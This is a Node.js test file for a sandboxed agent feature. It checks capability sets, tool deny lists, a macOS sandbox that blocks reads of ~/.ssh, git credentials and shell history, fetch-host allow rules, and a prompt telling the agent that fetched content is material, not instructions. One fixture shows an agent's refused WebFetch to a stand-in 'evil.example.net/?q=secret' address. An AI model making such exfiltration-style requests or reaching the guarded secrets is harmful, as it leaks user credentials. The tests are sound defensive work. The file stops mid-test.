// tk-read.test.mjs — what a `/tk` passage's agent may use (tk-read.mjs, oneshot.mjs): the capability set chosen by one function, the
// settings and their check, the exact CLI arguments for each set, the OS wrapper's refusals (stub programs under the real profile, no
// model), the time ceiling, and the private record of what a passage used. The changelog's tool-less one-shot is byte-identical.
//
//   node --test test/tk-read.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { EventEmitter } from 'node:events';
import { PassThrough } from 'node:stream';
import { spawnSync, spawn as realSpawn } from 'node:child_process';
import * as T from '../tk-read.mjs';
import * as O from '../oneshot.mjs';
import * as G from '../tkgaps.mjs';

const tmp = () => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'bfp-tkread-')));
const mac = process.platform === 'darwin' && fs.existsSync('/usr/bin/sandbox-exec');

test('the capability sets: one named list, chosen by one function from the settings, the agent and the channel', () => {
  assert.deepEqual(T.TK_CAPS, ['none', 'web', 'web+notes']);
  const roots = { roots: ['/x'], hubLinkNotes: 'off' };
  assert.equal(T.tkCapsFor({ read: roots, agent: 'claude', channel: 'drawer' }), 'web+notes');
  assert.equal(T.tkCapsFor({ read: roots, agent: 'claude', channel: 'api' }), 'web+notes', 'fill-gap and tools on the machine');
  assert.equal(T.tkCapsFor({ read: roots, agent: 'claude', channel: 'hub-link' }), 'web', 'the hub link: no notes while the setting is off');
  assert.equal(T.tkCapsFor({ read: { ...roots, hubLinkNotes: 'on' }, agent: 'claude', channel: 'hub-link' }), 'web+notes');
  assert.equal(T.tkCapsFor({ read: roots, agent: 'codex', channel: 'drawer' }), 'web', 'Codex reads files only through a shell, which it never has');
  assert.equal(T.tkCapsFor({ read: { roots: [], hubLinkNotes: 'on' }, agent: 'claude', channel: 'drawer' }), 'web', 'no roots: no notes (no default guessed)');
  assert.deepEqual(T.TK_CAPS_TIME_MS, { none: 90000, web: 180000, 'web+notes': 180000 });
  // FAIL CLOSED: a gap that does not say who wrote its instruction (written before `from`), or says something unknown, is web only
  for (const channel of [undefined, '', 'bogus', 'hub', null]) assert.equal(T.tkCapsFor({ read: { ...roots, hubLinkNotes: 'on' }, agent: 'claude', channel }), 'web', String(channel));
  assert.deepEqual(T.MACHINE_CHANNELS, ['drawer', 'reading-room', 'api']);
});

test('WHO WROTE THE INSTRUCTION is the gap\'s own `from`, set when the instruction is born: a later save of other words keeps it; new words are the writer\'s', () => {
  const filed = G.buildGaps('From the Hub.\n/tk what do my notes say', [], { channel: 'hub-link' });
  assert.equal(filed.gaps[0].from, 'hub-link');
  const answered = filed.gaps.map(g => ({ ...g, mode: 'filled-by-agent', text: 'Said.' }));
  // the owner saves the message in the drawer, the instruction's words unchanged: still the Hub's
  const saved = G.buildGaps('From the Hub, and a word of mine.\n/tk what do my notes say', answered, { channel: 'drawer' });
  assert.deepEqual([saved.gaps[0].from, saved.gaps[0].mode, saved.fresh], ['hub-link', 'filled-by-agent', []]);
  // …and asked again (Write again, or the Hub's Redo): pending keeps who wrote it
  const again = G.gapMove({ ...saved.gaps[0] }, 'pending');
  assert.equal(again.from, 'hub-link');
  // the owner rewords the instruction in the drawer: those words are the owner's
  const reworded = G.buildGaps('From the Hub.\n/tk what do my notes say about ships', answered, { channel: 'drawer' });
  assert.deepEqual([reworded.gaps[0].from, reworded.gaps[0].hand], ['drawer', 'prompt']);
  // an unknown channel writes nothing (and so reads as web only)
  assert.equal(G.buildGaps('x\n/tk y', [], { channel: 'bogus' }).gaps[0].from, undefined);
  assert.equal(G.buildGaps('x\n/tk y', []).gaps[0].from, undefined);
  assert.equal(T.tkCapsFor({ read: { roots: ['/x'], hubLinkNotes: 'off' }, agent: 'claude', channel: saved.gaps[0].from }), 'web');
});

test('the settings: tk_read_roots (absolute folders, none by default, never home or a secrets folder) and hub_link_tk_notes (off by default)', () => {
  const home = tmp();
  fs.mkdirSync(path.join(home, 'Notes'));
  fs.mkdirSync(path.join(home, '.ssh'));
  const ok = T.validateTkRead({ tk_read_roots: [path.join(home, 'Notes')] }, { home });
  assert.deepEqual([ok.ok, ok.roots, ok.hubLinkNotes], [true, [path.join(home, 'Notes')], 'off']);
  assert.deepEqual(T.validateTkRead({}, { home }), { ok: true, errors: [], roots: [], hubLinkNotes: 'off' });
  for (const bad of [[home], ['/'], [path.join(home, '.ssh')], ['relative'], [path.join(home, 'missing')], 'not a list'])
    assert.equal(T.validateTkRead({ tk_read_roots: bad }, { home }).ok, false, JSON.stringify(bad));
  assert.equal(T.validateTkRead({ hub_link_tk_notes: 'yes' }, { home }).ok, false);
  assert.equal(T.validateTkRead({ tk_read_roots: [path.join(home, 'Notes'), path.join(home, 'notes')] }, { home, platform: 'darwin' }).roots.length, mac ? 1 : 2, 'one folder named twice is one root');
  assert.equal(T.validateTkRead({ hub_link_tk_notes: 'on' }, { home }).hubLinkNotes, 'on');
});

test('A CASE-INSENSITIVE DISK (macOS): a root spelled in another case or Unicode form is still home or a secrets folder, and refused', { skip: !mac && 'macOS only' }, () => {
  const base = tmp();
  const home = path.join(base, 'CaseHome');
  for (const d of ['.ssh', '.config', 'Notes']) fs.mkdirSync(path.join(home, d), { recursive: true });
  const ok = T.validateTkRead({ tk_read_roots: [path.join(home, 'Notes')] }, { home });
  assert.deepEqual(ok.roots, [path.join(home, 'Notes')]);
  // the reviewer's forms: the home folder in lower case, the secret folders in other cases, a path above home in upper case
  for (const bad of [path.join(base, 'casehome'), base.toUpperCase(), path.join(home, '.SSH'), path.join(home, '.Config'), path.join(base.toLowerCase(), 'CASEHOME', '.Ssh'), path.join(home, '.CLAUDE')]) {
    if (!fs.existsSync(bad)) fs.mkdirSync(bad, { recursive: true });
    const v = T.validateTkRead({ tk_read_roots: [bad] }, { home });
    assert.equal(v.ok, false, bad);
    assert.deepEqual(v.roots, []);
  }
  // the same folder in another Unicode form (é composed, and decomposed)
  const uhome = path.join(base, 'Caf\u00e9');
  fs.mkdirSync(uhome);
  assert.equal(T.validateTkRead({ tk_read_roots: [uhome.normalize('NFD')] }, { home: uhome }).ok, false, 'home in NFD');
  assert.equal(T.pathKey('/Users/A/Caf\u0065\u0301', 'darwin'), T.pathKey('/users/a/caf\u00e9', 'darwin'));
  assert.notEqual(T.pathKey('/Users/A', 'linux'), T.pathKey('/users/a', 'linux'), 'elsewhere: as given');
});

test('botference tk-read check: says the roots and the hub link setting, every problem; exit 1 when invalid', async () => {
  const { main } = await import('../tk-read-cli.mjs');
  const home = tmp();
  fs.mkdirSync(path.join(home, 'Notes'));
  const run = cfg => { const out = []; const code = main(['check'], { config: () => cfg, configPath: '/x/config.json', home, say: s => out.push(s), claudeVersion: () => O.CLAUDE_FETCH_RULES_VERSION }); return { code, text: out.join('\n') }; };
  const good = run({ tk_read_roots: [path.join(home, 'Notes')] });
  assert.equal(good.code, 0, good.text);
  assert.match(good.text, /Notes/);
  assert.match(good.text, /through your Hub: web only/);
  assert.match(run({}).text, /no folders: passages search the web only/);
  assert.equal(run({ tk_read_roots: [home] }).code, 1);
});

// THE ARGUMENTS, exactly. `none` is what the companion has always sent (the changelog line still uses it).
const NONE_CLAUDE = ['-p', '--tools', '', '--strict-mcp-config', '--restricted',
  '--settings', JSON.stringify({ permissions: { defaultMode: 'dontAsk', allow: [], deny: ['Bash', 'Read', 'Edit', 'Write', 'NotebookEdit', 'Glob', 'Grep', 'WebFetch', 'WebSearch', 'Task', 'Agent', 'TodoWrite', 'mcp__*'] } }),
  '--output-format', 'text', '--model=m1', '--effort=low'];
test('ARGUMENTS for `none` are byte-identical to before (the changelog line); `web` and `web+notes` allow exactly those tools', () => {
  assert.deepEqual(O.oneshotCommand('claude', { model: 'm1', effort: 'low' }).args, NONE_CLAUDE);
  assert.deepEqual(O.oneshotCommand('claude', { model: 'm1', effort: 'low', caps: 'none' }).args, NONE_CLAUDE);
  const web = O.oneshotCommand('claude', { model: 'm1', caps: 'web' }).args;
  assert.deepEqual(web.slice(0, 7), ['-p', '--tools', 'WebSearch,WebFetch', '--strict-mcp-config', '--restricted', '--no-session-persistence', '--settings']);
  const ws = JSON.parse(web[7]).permissions;
  assert.deepEqual([ws.defaultMode, ws.allow], ['dontAsk', ['WebSearch', 'WebFetch']]);
  for (const t of ['Bash', 'Edit', 'Write', 'NotebookEdit', 'Read', 'Glob', 'Grep', 'Task', 'Agent', 'TodoWrite', 'mcp__*']) assert.ok(ws.deny.includes(t), t);
  assert.deepEqual(web.slice(8, 11), ['--output-format', 'stream-json', '--verbose']);
  assert.ok(!web.includes('--add-dir'));
  const notes = O.oneshotCommand('claude', { caps: 'web+notes', roots: ['/r/one', '/r/two'], fetchHosts: ['www.example.com'] , cliVersion: O.CLAUDE_FETCH_RULES_VERSION }).args;
  assert.equal(notes[notes.indexOf('--tools') + 1], 'WebSearch,WebFetch,Read,Glob,Grep');
  const ns = JSON.parse(notes[notes.indexOf('--settings') + 1]).permissions;
  assert.deepEqual(ns.allow, ['WebSearch', 'WebFetch(domain:www.example.com)', 'Read', 'Glob', 'Grep']);
  for (const t of ['Bash', 'Edit', 'Write', 'NotebookEdit', 'Task', 'Agent', 'TodoWrite', 'mcp__*']) assert.ok(ns.deny.includes(t), t);
  assert.deepEqual(notes.filter((a, i) => notes[i - 1] === '--add-dir'), ['/r/one', '/r/two']);
  // Codex: web search on (the model provider's own search), everything else as before; never notes
  const cnone = O.oneshotCommand('codex', { dir: '/d', out: '/o' }).args;
  const cweb = O.oneshotCommand('codex', { dir: '/d', out: '/o', caps: 'web' }).args;
  assert.ok(cnone.includes('web_search="disabled"') && !cnone.includes('--json'));
  assert.deepEqual(cweb.filter(a => a !== 'web_search="live"' && a !== '--json'), cnone.filter(a => a !== 'web_search="disabled"'));
  assert.ok(cweb.includes('web_search="live"') && cweb.includes('--json'));
  assert.ok(cweb.includes('--sandbox') && cweb[cweb.indexOf('--sandbox') + 1] === 'read-only');
  assert.deepEqual(O.oneshotCommand('codex', { dir: '/d', out: '/o', caps: 'web+notes' }).args, cweb, 'Codex never gets notes');
});

test('THE CLAUDE WRAPPER (macOS): writes only its own folders, starts only its own program, refuses the secret places and other temporary folders; a root is readable', { skip: !mac && 'macOS only' }, () => {
  const work = tmp(), root = tmp(), other = tmp();
  fs.writeFileSync(path.join(root, 'note.md'), 'a note');
  fs.writeFileSync(path.join(other, 'outside.md'), 'outside');
  // stub programs in place of the CLI: its "install" is /bin and /usr/bin, so they may start
  const env = { HOME: os.homedir(), PATH: '/usr/bin:/bin' };
  const jail = bin => O.claudeJail({ env, work, roots: [root], bin, install: path.dirname(bin) });
  const run = (bin, args) => { const j = jail(bin); assert.ok(j.ok, j.error); const r = spawnSync(j.argv[0], [...j.argv.slice(1), ...args], { cwd: work, encoding: 'utf8' }); return r; };
  assert.equal(run('/bin/cat', [path.join(root, 'note.md')]).stdout, 'a note', 'a file under a root is read');
  assert.notEqual(run('/bin/cat', [path.join(other, 'outside.md')]).status, 0, 'a file in another temporary folder is refused');
  assert.notEqual(run('/usr/bin/touch', [path.join(other, 'new.md')]).status, 0, 'no write outside');
  assert.notEqual(run('/usr/bin/touch', [path.join(root, 'new.md')]).status, 0, 'no write into the notes either');
  assert.equal(fs.existsSync(path.join(root, 'new.md')), false);
  assert.equal(run('/usr/bin/touch', [path.join(work, 'scratch')]).status, 0, 'its own folder is writable');
  assert.notEqual(run('/usr/bin/env', ['/bin/echo', 'x']).status, 0, 'no other program');
  // (the secret places are refused by rule; the test does not touch them: it reads the rule)
  const p = jail('/bin/cat').argv[2];
  for (const place of O.CLAUDE_PRIVATE_PLACES) assert.ok(p.includes(`(subpath "${path.join(fs.realpathSync.native(os.homedir()), place)}")`), place);
  assert.match(p, /\(deny file-write\*\)/);
  assert.match(p, /\(deny process-exec\)/);
});

test('THE PRIVATE PLACES COME LAST and win: a root that is, or links into, a secret folder (in any case) reads nothing there; ~/.claude.json is written exactly', { skip: !mac && 'macOS only' }, () => {
  const home = path.join(tmp(), 'FakeHome');
  fs.mkdirSync(path.join(home, '.ssh'), { recursive: true });
  fs.writeFileSync(path.join(home, '.ssh', 'id_fixture'), 'FIXTURE KEY');
  fs.mkdirSync(path.join(home, '.config', 'anthropic'), { recursive: true });
  fs.mkdirSync(path.join(home, '.config', 'gh'), { recursive: true });
  fs.writeFileSync(path.join(home, '.config', 'gh', 'hosts.yml'), 'FIXTURE TOKEN');
  fs.writeFileSync(path.join(home, '.config', 'anthropic', 'kept'), 'FIXTURE SIGN-IN');
  for (const f of ['.zsh_history', '.git-credentials']) fs.writeFileSync(path.join(home, f), 'FIXTURE');
  fs.mkdirSync(path.join(home, '.claude', 'projects', 'p'), { recursive: true });
  fs.writeFileSync(path.join(home, '.claude', 'projects', 'p', 't.jsonl'), 'FIXTURE TRANSCRIPT');
  fs.mkdirSync(path.join(home, 'notes'));
  fs.symlinkSync(path.join(home, '.ssh'), path.join(home, 'notes', 'sshlink'));
  const work = tmp();
  const env = { HOME: home, PATH: '/usr/bin:/bin' };
  const run = (roots, bin, args) => { const j = O.claudeJail({ env, work, roots, bin, install: path.dirname(bin) }); assert.ok(j.ok, j.error); return spawnSync(j.argv[0], [...j.argv.slice(1), ...args], { cwd: work, encoding: 'utf8' }); };
  for (const [roots, file] of [[[path.join(home, '.SSH')], path.join(home, '.SSH', 'id_fixture')], [[path.join(home, '.ssh')], path.join(home, '.ssh', 'id_fixture')],
    [[path.join(home, 'notes')], path.join(home, 'notes', 'sshlink', 'id_fixture')], [[home], path.join(home, '.Config', 'gh', 'hosts.yml')],
    [[home], path.join(home, '.zsh_history')], [[home], path.join(home, '.git-credentials')], [[home], path.join(home, '.claude', 'projects', 'p', 't.jsonl')]]) {
    const r = run(roots, '/bin/cat', [file]);
    assert.ok(r.status !== 0 && !/FIXTURE/.test(r.stdout), `${file} under root ${roots[0]}`);
  }
  assert.equal(run([home], '/bin/cat', [path.join(home, '.config', 'anthropic', 'kept')]).stdout, 'FIXTURE SIGN-IN', 'what sign-in needs stays readable');
  // THE CLI'S SIGN-IN (a real run failed for three minutes without these): /usr/bin/security may start (and nothing else outside the
  // CLI's install), ~/.config/anthropic and ~/.local/state/claude may be written, ~/.config/gh still may not
  const prof0 = O.claudeJail({ env, work, roots: [], bin: '/bin/cat', install: '/bin' }).argv[2];
  assert.match(prof0, /\(allow process-exec \(subpath "\/bin"\) \(literal "\/usr\/bin\/security"\)\)/);
  assert.deepEqual(O.CLAUDE_SIGN_IN_PROGRAMS, ['/usr/bin/security']);
  // (a shell in place of the CLI, its install /bin: it may start /usr/bin/security, and nothing else under /usr/bin)
  const sh = cmdline => { const j = O.claudeJail({ env, work, roots: [home], bin: '/bin/sh', install: '/bin' }); return spawnSync(j.argv[0], [...j.argv.slice(1), '-c', cmdline], { cwd: work, encoding: 'utf8' }); };
  assert.notEqual(sh('/usr/bin/true').status, 0, 'another program still refused');
  assert.notEqual(sh('/usr/bin/env true').status, 0);
  assert.ok(!/Operation not permitted/.test(sh('/usr/bin/security -h 2>&1').stdout), 'the keychain program may start');
  assert.equal(run([home], '/usr/bin/touch', [path.join(home, '.config', 'anthropic', 'state')]).status, 0, 'sign-in state is written');
  assert.notEqual(run([home], '/usr/bin/touch', [path.join(home, '.config', 'gh', 'x')]).status, 0, 'the rest of ~/.config: neither');
  fs.mkdirSync(path.join(home, '.local', 'state', 'claude'), { recursive: true });
  assert.equal(run([home], '/usr/bin/touch', [path.join(home, '.local', 'state', 'claude', 's')]).status, 0, 'the CLI\'s own state');
  assert.notEqual(run([home], '/usr/bin/touch', [path.join(home, '.local', 'state', 'other')]).status, 0);
  // the order: every allow of a root comes before the private places' deny
  const prof = O.claudeJail({ env, work, roots: [path.join(home, 'notes')], bin: '/bin/cat', install: '/bin' }).argv[2];
  assert.ok(prof.indexOf(`(subpath "${path.join(fs.realpathSync.native(home), 'notes')}")`) < prof.indexOf('(deny file-read* file-write* (subpath'), 'roots first, private places last');
  // ~/.claude.json exactly (and the CLI's own temporary names for it), never a name that merely begins so (this home sits in a temporary
  // folder, which the wrapper does not let it read, so it is given as a root here to be looked up at all)
  assert.equal(run([home], '/usr/bin/touch', [path.join(home, '.claude.json')]).status, 0);
  assert.equal(run([home], '/usr/bin/touch', [path.join(home, '.claude.json.tmp.123.abcdef012345')]).status, 0);
  for (const f of ['.claude.jsonX', '.claude.json.evil', '.claude.json.backup.1']) assert.notEqual(run([home], '/usr/bin/touch', [path.join(home, f)]).status, 0, f);
});

test('ONE SOURCE FOR THE LIMITS: the run\'s ceiling is tk-read\'s TK_CAPS_TIME_MS', () => {
  for (const c of T.TK_CAPS) assert.equal(O.timeLimitFor(c), T.TK_CAPS_TIME_MS[c], c);
});

test('A RUN PAST ITS TIME IS STOPPED WHOLE: the CLI and what it started (its process group)', async () => {
  const dir = tmp();
  const pidFile = path.join(dir, 'grandchild.pid');
  const spawnSh = (cmd, args, o) => realSpawn('/bin/sh', ['-c', `sleep 30 & echo $! > ${pidFile}; wait`], o);
  const r = await O.runOneShot('claude', 'p', { caps: 'web', spawn: spawnSh, claudeJail: () => ({ ok: true, argv: ['claude'] }), timeoutMs: 400 });
  assert.equal(r.ok, false);
  const pid = Number(fs.readFileSync(pidFile, 'utf8'));
  let alive = true;
  for (let i = 0; i < 40 && alive; i++) { try { process.kill(pid, 0); await new Promise(res => setTimeout(res, 25)); } catch { alive = false; } }
  assert.equal(alive, false, 'the sleeping grandchild is gone too');
});

// a stand-in CLI answering as `claude -p --output-format stream-json --verbose` does: tool uses, then the result
const streamSpawn = (lines, record = []) => (cmd, args, o) => {
  const child = new EventEmitter();
  child.stdout = new PassThrough(); child.stdin = new PassThrough();
  child.kill = () => setImmediate(() => child.emit('close', null));
  record.push({ cmd, args, o });
  child.stdin.on('finish', () => { if (lines === null) return; child.stdout.end(lines.map(l => JSON.stringify(l)).join('\n') + '\n'); setImmediate(() => child.emit('close', 0)); });
  child.stdin.resume();
  return child;
};
const noJail = () => ({ ok: true, argv: ['claude'] });
test('WHAT A PASSAGE USED is read from the stream (web addresses fetched, note paths read), privately; the text is the result', async () => {
  const lines = [
    { type: 'system', subtype: 'init' },
    { type: 'assistant', message: { content: [{ type: 'tool_use', name: 'WebSearch', input: { query: 'ships' } }] } },
    { type: 'assistant', message: { content: [{ type: 'tool_use', name: 'WebFetch', input: { url: 'https://www.example.com/a' } }] } },
    { type: 'assistant', message: { content: [{ type: 'tool_use', name: 'Read', input: { file_path: '/r/one/n.md' } }, { type: 'text', text: 'thinking' }] } },
    { type: 'result', subtype: 'success', result: 'The passage, written.' },
  ];
  const rec = [];
  let jailed = null;
  const r = await O.runOneShot('claude', 'p', { caps: 'web+notes', roots: ['/r/one'], spawn: streamSpawn(lines, rec), cliVersion: async () => O.CLAUDE_FETCH_RULES_VERSION, claudeJail: o => { jailed = o; return noJail(); } });
  // its own temporary folder (the CLI cannot start in the wrapper without one), given to the wrapper too; its own process group
  assert.ok(rec[0].o.env.CLAUDE_CODE_TMPDIR && rec[0].o.env.CLAUDE_CODE_TMPDIR === jailed.tmp && jailed.tmp !== jailed.work);
  assert.equal(rec[0].o.detached, true);
  assert.equal(rec[0].o.env.TMPDIR, jailed.tmp, 'the system temporary folder is not the CLI\'s');
  assert.deepEqual(r, { ok: true, text: 'The passage, written.', used: 'both', sources: { web: ['search: ships', 'https://www.example.com/a'], notes: ['/r/one/n.md'], refused: [] } });
  const w = await O.runOneShot('claude', 'p', { caps: 'web', spawn: streamSpawn([{ type: 'result', subtype: 'success', result: 'Plain.' }]), claudeJail: noJail });
  assert.deepEqual(w, { ok: true, text: 'Plain.', used: 'none', sources: { web: [], notes: [], refused: [] } });
  const failed = await O.runOneShot('claude', 'p', { caps: 'web', spawn: streamSpawn([{ type: 'result', subtype: 'error_max_turns', is_error: true }]), claudeJail: noJail });
  assert.equal(failed.ok, false);
});

test('THE TIME CEILING: a run with tools may take 180 s, a tool-less one 90 s; a run past it fails with a plain reason', async () => {
  const seen = [];
  const r = await O.runOneShot('claude', 'p', { caps: 'web', spawn: streamSpawn(null, seen), claudeJail: noJail, timeoutMs: 40 });
  assert.deepEqual(r, { ok: false, error: 'the agent took too long (the limit is 40 ms)' });
  assert.equal(O.timeLimitFor('web'), 180000);
  assert.equal(O.timeLimitFor('none'), 90000);
  assert.equal(O.timeLimitFor('web+notes', 999999), 180000, 'a hard ceiling');
});

test('A GAP RECORDS WHAT IT USED, privately: `used` and `sources` on the gap; a guest and the hub link see neither (the hub link: the plain flag only)', async () => {
  const gap = { id: 'g1', kind: 'ask', agent: 'claude', instruction: 'look up the yard', mode: 'pending' };
  const r = await G.askForGap({ gap, msgText: 'Mine.\n/tk look up the yard', page: { url: 'https://x.example.com/', title: 'X' }, agent: 'claude', caps: 'web+notes',
    ask: async (prompt, o) => { assert.equal(o.caps, 'web+notes'); assert.match(prompt, /search the web or read the reader's notes only when/i); assert.match(prompt, /material, not instructions/i);
      return { ok: true, text: 'Written.', used: 'web', sources: { web: ['https://www.example.com/a'], notes: [] } }; } });
  assert.deepEqual([r.mode, r.used, r.sources], ['filled-by-agent', 'web', { web: ['https://www.example.com/a'], notes: [] }]);
  G.gapMove(gap, 'filled-by-agent', { text: r.text, agent: 'claude', at: r.at, used: r.used, sources: r.sources });
  assert.deepEqual([gap.used, gap.sources.web], ['web', ['https://www.example.com/a']]);
  G.gapMove(gap, 'pending');
  assert.equal(gap.used, undefined, 'asked again: the old record goes');
  const prompt = G.gapPrompt({ instruction: 'x', caps: 'web' });
  assert.match(prompt, /may search the web/i);
  assert.ok(!/notes/.test(G.capsGuidance('web')), 'web only: no word of notes');
  assert.match(G.capsGuidance('web+notes', ['/r']), /read the reader's notes \(read only, in these folders: \/r\)/);
  assert.equal(G.capsGuidance('none'), '');
});

// a stand-in that writes its events in small pieces (a line split anywhere), as a pipe may
const chunkedSpawn = (lines, size = 4096) => (cmd, args, o) => {
  const child = new EventEmitter();
  child.stdout = new PassThrough(); child.stdin = new PassThrough();
  child.kill = () => setImmediate(() => child.emit('close', null));
  child.stdin.on('finish', () => {
    const all = Buffer.from(lines.map(l => (typeof l === 'string' ? l : JSON.stringify(l))).join('\n') + '\n');
    for (let i = 0; i < all.length; i += size) child.stdout.write(all.subarray(i, i + size));
    child.stdout.end();
    child.stdout.on('end', () => setImmediate(() => child.emit('close', 0)));
  });
  child.stdin.resume();
  return child;
};
test('THE EVENTS ARE READ AS THEY ARRIVE and tool results are never kept: a 100 KB note, thousands of small tool calls, a giant line', async () => {
  const note = 'N'.repeat(100 * 1024);
  const big = [
    { type: 'assistant', message: { content: [{ type: 'tool_use', id: 'r1', name: 'Read', input: { file_path: '/r/one/big.md' } }] } },
    { type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 'r1', content: note }] } },
    { type: 'result', subtype: 'success', result: 'From the big note.' },
  ];
  const r = await O.runOneShot('claude', 'p', { caps: 'web+notes', roots: ['/r/one'], spawn: chunkedSpawn(big, 1000), cliVersion: async () => O.CLAUDE_FETCH_RULES_VERSION, claudeJail: noJail });
  assert.deepEqual([r.ok, r.text, r.used, r.sources.notes], [true, 'From the big note.', 'notes', ['/r/one/big.md']]);
  const many = [];
  for (let i = 0; i < 3000; i++) {
    many.push({ type: 'assistant', message: { content: [{ type: 'tool_use', id: `g${i}`, name: 'Grep', input: { path: '/r/one', pattern: `w${i}` } }] } });
    many.push({ type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: `g${i}`, content: `/r/one/n${i}.md: a line of the note` }] } });
  }
  many.push({ type: 'result', subtype: 'success', result: 'After many searches.' });
  const m = await O.runOneShot('claude', 'p', { caps: 'web+notes', roots: ['/r/one'], spawn: chunkedSpawn(many), cliVersion: async () => O.CLAUDE_FETCH_RULES_VERSION, claudeJail: noJail });
  assert.deepEqual([m.ok, m.text, m.sources.notes.length], [true, 'After many searches.', O.STREAM_LIMITS.sources], 'the record is capped');
  // a line past lineBytes is skipped unread; the result after it still counts
  const giant = [JSON.stringify({ type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 'x', content: 'G'.repeat(O.STREAM_LIMITS.lineBytes + 10) }] } }),
    { type: 'result', subtype: 'success', result: 'Still here.' }];
  const g = await O.runOneShot('claude', 'p', { caps: 'web', spawn: chunkedSpawn(giant, 1 << 20), claudeJail: noJail });
  assert.deepEqual([g.ok, g.text], [true, 'Still here.']);
  // the passage itself is cut at maxBytes, as before
  const long = await O.runOneShot('claude', 'p', { caps: 'web', maxBytes: 100, spawn: chunkedSpawn([{ type: 'result', subtype: 'success', result: 'w'.repeat(500) }]), claudeJail: noJail });
  assert.equal(long.text.length, 100);
  // Codex's events go through the same reader (a long event is no failure)
  const lineReader = [];
  const split = O.lineSplitter(l => lineReader.push(l.length), { lineBytes: 10 });
  split.push(Buffer.from('abc\n0123456789ABCDEF\nxy')); split.push(Buffer.from('z\n')); split.end();
  assert.deepEqual(lineReader, [3, 3], 'a line past the limit is dropped, the others kept whole across pieces');
});

test('WHERE A NOTES RUN MAY FETCH: only the hosts the owner\'s line names (WebFetch(domain:…) rules, the CLI\'s own pre-approved sites denied by name); a web-only run fetches freely', () => {
  assert.deepEqual(T.ownerHosts('Compare https://www.example.com/a?b=1 with news.example.org/story and www.example.net, not notes.md or 10.0.0.1/x or https://EXAMPLE.com:8443/x'),
    ['www.example.com', 'news.example.org', 'www.example.net', 'example.com']);
  assert.deepEqual(T.ownerHosts('/tk what do my notes say'), []);
  const a = O.oneshotCommand('claude', { caps: 'web+notes', roots: ['/r'], fetchHosts: ['www.example.com', 'bad host', '-x.example.com'] , cliVersion: O.CLAUDE_FETCH_RULES_VERSION }).args;
  const p = JSON.parse(a[a.indexOf('--settings') + 1]).permissions;
  assert.equal(a[a.indexOf('--tools') + 1], 'WebSearch,WebFetch,Read,Glob,Grep');
  assert.deepEqual(p.allow, ['WebSearch', 'WebFetch(domain:www.example.com)', 'Read', 'Glob', 'Grep'], 'never the bare WebFetch');
  assert.ok(p.deny.includes('WebFetch(domain:github.com)') && p.deny.includes('WebFetch(domain:docs.python.org)'), 'the pre-approved sites, by name');
  assert.ok(!p.deny.includes('WebFetch(domain:www.example.com)') && !p.deny.includes('WebFetch'));
  assert.equal(O.CLAUDE_PREAPPROVED_FETCH_HOSTS.length, 93);
  // a named host that is also pre-approved is not denied
  const gh = JSON.parse(O.oneshotCommand('claude', { caps: 'web+notes', fetchHosts: ['github.com'] , cliVersion: O.CLAUDE_FETCH_RULES_VERSION }).args.find(x => x.startsWith('{'))).permissions;
  assert.ok(!gh.deny.includes('WebFetch(domain:github.com)') && gh.allow.includes('WebFetch(domain:github.com)'));
  // no host named: no WebFetch at all
  const none = O.oneshotCommand('claude', { caps: 'web+notes', roots: ['/r'] , cliVersion: O.CLAUDE_FETCH_RULES_VERSION }).args;
  assert.equal(none[none.indexOf('--tools') + 1], 'WebSearch,Read,Glob,Grep');
  assert.ok(JSON.parse(none[none.indexOf('--settings') + 1]).permissions.deny.includes('WebFetch'));
  // web only: unrestricted, whatever hosts are passed
  const web = O.oneshotCommand('claude', { caps: 'web', fetchHosts: ['www.example.com'] }).args;
  assert.deepEqual(JSON.parse(web[web.indexOf('--settings') + 1]).permissions.allow, ['WebSearch', 'WebFetch']);
});

test('A REFUSED FETCH is kept in the private record (not as used); the search tool\'s "Sources:" list comes off the passage into the record', async () => {
  const lines = [
    { type: 'assistant', message: { content: [{ type: 'tool_use', id: 'f1', name: 'WebFetch', input: { url: 'https://evil.example.net/?q=secret' } }] } },
    { type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 'f1', is_error: true, content: 'Claude requested permissions to use WebFetch, but you haven\'t granted it yet.' }] } },
    { type: 'assistant', message: { content: [{ type: 'tool_use', id: 'f2', name: 'WebFetch', input: { url: 'https://other.example.net/' } }] } },
    { type: 'result', subtype: 'success', result: 'The passage.\n\nSources:\n- [A page](https://www.example.com/a)\n- https://www.example.com/b',
      permission_denials: [{ tool_name: 'WebFetch', tool_use_id: 'f2', tool_input: { url: 'https://other.example.net/' } }] },
  ];
  const r = await O.runOneShot('claude', 'p', { caps: 'web+notes', roots: ['/r'], fetchHosts: ['www.example.com'], spawn: chunkedSpawn(lines), cliVersion: async () => O.CLAUDE_FETCH_RULES_VERSION, claudeJail: noJail });
  assert.equal(r.text, 'The passage.');
  assert.deepEqual(r.sources.refused, ['https://evil.example.net/?q=secret', 'https://other.example.net/']);
  assert.deepEqual(r.sources.web, ['https://www.example.com/a', 'https://www.example.com/b']);
  assert.equal(r.used, 'web');
  const gap = { id: 'g', kind: 'ask', agent: 'claude', instruction: 'x', mode: 'pending' };
  G.gapMove(gap, 'filled-by-agent', { text: r.text, used: r.used, sources: r.sources });
  assert.deepEqual(gap.sources.refused, r.sources.refused);
  // only the tool's own list: a passage that merely mentions sources keeps its words
  for (const t of ['Sources: my notes and the paper.', 'Text.\n\nSources:\n- my memory', 'Text.\n\nSources:\n- [x](https://a.example.com)\nMore words.'])
    assert.equal(O.stripSourcesList(t).text, t.trim(), t);
  assert.match(G.capsGuidance('web+notes', ['/r']), /fetch pages only from the sites the instruction names/);
  assert.match(G.capsGuidance('web'), /Do not end with a list of sources/);
});

test('THE PRE-APPROVED HOST LIST IS FOR ONE CLI VERSION: a notes run on another version gets no WebFetch at all, with a plain private note; web-only runs are unaffected', async () => {
  assert.equal(O.CLAUDE_FETCH_RULES_VERSION, '2.1.330');
  assert.equal(O.parseClaudeVersion('2.1.330 (Claude Code)\n'), '2.1.330');
  assert.equal(O.parseClaudeVersion('nonsense'), '');
  const on = O.oneshotCommand('claude', { caps: 'web+notes', roots: ['/r'], fetchHosts: ['www.example.com'], cliVersion: '2.1.330' }).args;
  assert.equal(on[on.indexOf('--tools') + 1], 'WebSearch,WebFetch,Read,Glob,Grep');
